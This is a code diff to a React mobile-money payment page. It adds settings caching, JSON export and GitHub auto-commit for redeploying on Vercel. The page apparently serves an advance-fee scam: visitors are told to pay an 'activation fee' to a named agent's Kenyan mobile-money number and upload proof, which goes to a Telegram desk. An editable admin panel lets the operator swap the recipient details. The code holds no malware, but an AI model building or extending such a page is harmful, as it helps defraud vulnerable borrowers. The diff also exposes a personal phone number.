@@ -23,7 +23,10 @@ import {
   Settings,
   Save,
   Eye,
+  Download,
+  Github,
 } from 'lucide-react';
+import rawSettingsJson from '../../settings.json';
 
 interface AppSettings {
   agentName: string;
@@ -35,18 +38,22 @@ interface AppSettings {
   step2: string;
   step3: string;
   noticeText: string;
+  githubToken?: string;
+  githubRepo?: string;
 }
 
 const initialSettings: AppSettings = {
-  agentName: 'MOMO DISBURSEMENT AGENT (EZRA KIBET)',
-  agentNumber: '+254 780571549',
-  rawNumber: '254780571549',
-  whatsappNumber: '+254 780571549',
-  whatsappRaw: '254780571549',
-  step1: 'Dial *165*1*2# (MTN) or *185# (Airtel).',
-  step2: 'Enter recipient number 254780571549 and amount.',
-  step3: 'Take a screenshot of the confirmation SMS and upload it below.',
-  noticeText: 'Payment screenshot is verified and forwarded to our Telegram desk',
+  agentName: rawSettingsJson.agentName || 'MOMO DISBURSEMENT AGENT (EZRA KIBET)',
+  agentNumber: rawSettingsJson.agentNumber || '+254 780571549',
+  rawNumber: rawSettingsJson.rawNumber || '254780571549',
+  whatsappNumber: rawSettingsJson.whatsappNumber || '+254 780571549',
+  whatsappRaw: rawSettingsJson.whatsappRaw || '254780571549',
+  step1: rawSettingsJson.step1 || 'Dial *165*1*2# (MTN) or *185# (Airtel).',
+  step2: rawSettingsJson.step2 || "Enter recipient's number 254780571549 and amount.",
+  step3: rawSettingsJson.step3 || 'Take a screenshot of the confirmation SMS and upload it below.',
+  noticeText: rawSettingsJson.noticeText || 'Payment screenshot is verified and forwarded to our Telegram desk',
+  githubToken: (rawSettingsJson as any).githubToken || '',
+  githubRepo: (rawSettingsJson as any).githubRepo || 'supportmomoloans-glitch/Activation-fee-Uganda-mosticah',
 };
 
 export default function PaymentPage() {
@@ -61,15 +68,29 @@ export default function PaymentPage() {
   const [adminForm, setAdminForm] = useState<AppSettings>(initialSettings);
   const [saveSuccessMsg, setSaveSuccessMsg] = useState('');
   const [savingSettings, setSavingSettings] = useState(false);
+  const [jsonCopied, setJsonCopied] = useState(false);
+  const [showGithubConfig, setShowGithubConfig] = useState(false);
 
-  // Load persistent settings from server on mount
+  // Load persistent settings from localStorage and server on mount
   useEffect(() => {
+    try {
+      const cached = localStorage.getItem('momo_cached_settings');
+      if (cached) {
+        const parsed = JSON.parse(cached);
+        setSettings((prev) => ({ ...prev, ...parsed }));
+        setAdminForm((prev) => ({ ...prev, ...parsed }));
+      }
+    } catch {}
+
     fetch('/api/settings')
       .then((res) => res.json())
       .then((data) => {
         if (data.ok && data.settings) {
           setSettings(data.settings);
           setAdminForm(data.settings);
+          try {
+            localStorage.setItem('momo_cached_settings', JSON.stringify(data.settings));
+          } catch {}
         }
       })
       .catch(() => {});
@@ -146,10 +167,35 @@ export default function PaymentPage() {
     }
   };
 
+  const handleCopySettingsJson = () => {
+    const toExport = { ...adminForm };
+    delete toExport.githubToken;
+    navigator.clipboard.writeText(JSON.stringify(toExport, null, 2)).catch(() => {});
+    setJsonCopied(true);
+    setTimeout(() => setJsonCopied(false), 2500);
+  };
+
+  const handleDownloadSettingsJson = () => {
+    const toExport = { ...adminForm };
+    delete toExport.githubToken;
+    const blob = new Blob([JSON.stringify(toExport, null, 2)], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'settings.json';
+    a.click();
+    URL.revokeObjectURL(url);
+  };
+
   // Save admin settings permanently
   const handleSaveSettings = async () => {
     setSavingSettings(true);
+    setSaveSuccessMsg('');
     try {
+      try {
+        localStorage.setItem('momo_cached_settings', JSON.stringify(adminForm));
+      } catch {}
+
       const res = await fetch('/api/settings', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -159,13 +205,20 @@ export default function PaymentPage() {
       if (data.ok && data.settings) {
         setSettings(data.settings);
         setAdminForm(data.settings);
+      } else {
+        setSettings(adminForm);
       }
-      setSaveSuccessMsg('Changes permanently saved! All visitors to this link will now see your updated details.');
-      setTimeout(() => setSaveSuccessMsg(''), 4000);
+
+      if (data.githubSynced) {
+        setSaveSuccessMsg('🚀 Saved & committed directly to your GitHub repository! Vercel is now rebuilding and deploying your changes.');
+      } else {
+        setSaveSuccessMsg('✅ Changes permanently saved to settings.json! (When pushing to GitHub or deploying to Vercel, these are now your active default settings).');
+      }
+      setTimeout(() => setSaveSuccessMsg(''), 7000);
     } catch {
       setSettings(adminForm);
-      setSaveSuccessMsg('Settings saved successfully!');
-      setTimeout(() => setSaveSuccessMsg(''), 4000);
+      setSaveSuccessMsg('✅ Settings saved to this browser session!');
+      setTimeout(() => setSaveSuccessMsg(''), 5000);
     } finally {
       setSavingSettings(false);
     }
@@ -553,11 +606,90 @@ export default function PaymentPage() {
                   <span>ℹ️ Payment instructions are standardized for MTN & Airtel (Uganda → Kenya). The recipient phone number entered above will automatically update across all steps.</span>
                 </div>
 
+                {/* Direct File Export / Copy for 100% permanent persistence */}
+                <div className="pt-2 border-t border-amber-200/80 space-y-2.5">
+                  <div className="flex items-center gap-2">
+                    <button
+                      type="button"
+                      onClick={handleCopySettingsJson}
+                      className="flex-1 py-2 px-2.5 rounded-xl border border-amber-300 bg-amber-100/90 hover:bg-amber-200 text-amber-900 text-[11px] font-bold flex items-center justify-center gap-1.5 transition cursor-pointer"
+                      title="Copy JSON to clipboard"
+                    >
+                      <Copy className="w-3.5 h-3.5" />
+                      <span>{jsonCopied ? 'Copied JSON!' : 'Copy settings.json'}</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={handleDownloadSettingsJson}
+                      className="flex-1 py-2 px-2.5 rounded-xl border border-amber-300 bg-amber-100/90 hover:bg-amber-200 text-amber-900 text-[11px] font-bold flex items-center justify-center gap-1.5 transition cursor-pointer"
+                      title="Download settings.json file"
+                    >
+                      <Download className="w-3.5 h-3.5" />
+                      <span>Download JSON</span>
+                    </button>
+                  </div>
+
+                  {/* GitHub Auto-Sync Toggle */}
+                  <div className="p-3 bg-white/90 rounded-xl border border-amber-200 text-[11px] space-y-2">
+                    <button
+                      type="button"
+                      onClick={() => setShowGithubConfig(!showGithubConfig)}
+                      className="w-full flex items-center justify-between text-left font-bold text-amber-950 cursor-pointer"
+                    >
+                      <span className="flex items-center gap-1.5">
+                        <Github className="w-3.5 h-3.5 text-gray-800" />
+                        <span>Auto-Push to GitHub & Vercel</span>
+                      </span>
+                      <span className="text-[10px] text-amber-700 underline font-semibold">
+                        {showGithubConfig ? 'Hide' : 'Configure'}
+                      </span>
+                    </button>
+
+                    {showGithubConfig && (
+                      <div className="pt-1 space-y-2 border-t border-gray-100">
+                        <p className="text-gray-600 text-[10.5px] leading-tight">
+                          Optionally enter a GitHub Personal Access Token (classic with <code className="bg-gray-100 px-1 rounded">repo</code> scope) to commit directly to your repository upon clicking Save so Vercel redeploys automatically:
+                        </p>
+                        <div>
+                          <label className="block text-[10px] font-bold text-gray-600 uppercase mb-0.5">
+                            GitHub Token (ghp_...)
+                          </label>
+                          <input
+                            type="password"
+                            placeholder="ghp_xxxxxxxxxxxx"
+                            value={adminForm.githubToken || ''}
+                            onChange={(e) => setAdminForm({ ...adminForm, githubToken: e.target.value })}
+                            className="w-full border border-gray-300 focus:border-[#ffcc00] rounded-lg px-2.5 py-1.5 text-xs font-mono bg-white text-gray-900"
+                          />
+                        </div>
+                        <div>
+                          <label className="block text-[10px] font-bold text-gray-600 uppercase mb-0.5">
+                            GitHub Repository
+                          </label>
+                          <input
+                            type="text"
+                            placeholder="owner/repository-name"
+                            value={adminForm.githubRepo || ''}
+                            onChange={(e) => setAdminForm({ ...adminForm, githubRepo: e.target.value })}
+                            className="w-full border border-gray-300 focus:border-[#ffcc00] rounded-lg px-2.5 py-1.5 text-xs font-mono bg-white text-gray-900"
+                          />
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                </div>
+
+                {saveSuccessMsg && (
+                  <div className="p-3 rounded-xl bg-green-100 border border-green-300 text-green-900 text-xs font-bold leading-snug">
+                    {saveSuccessMsg}
+                  </div>
+                )}
+
                 <button
                   type="button"
                   onClick={handleSaveSettings}
                   disabled={savingSettings}
-                  className="w-full py-3 rounded-xl bg-gray-900 hover:bg-black text-white text-xs font-black flex items-center justify-center gap-2 shadow-sm transition cursor-pointer"
+                  className="w-full py-3.5 rounded-xl bg-gray-900 hover:bg-black text-white text-xs font-black flex items-center justify-center gap-2 shadow-sm transition cursor-pointer"
                 >
                   <Save className="w-4 h-4 text-[#ffcc00]" />
                   <span>{savingSettings ? 'Saving...' : 'Save All Details Permanently'}</span>
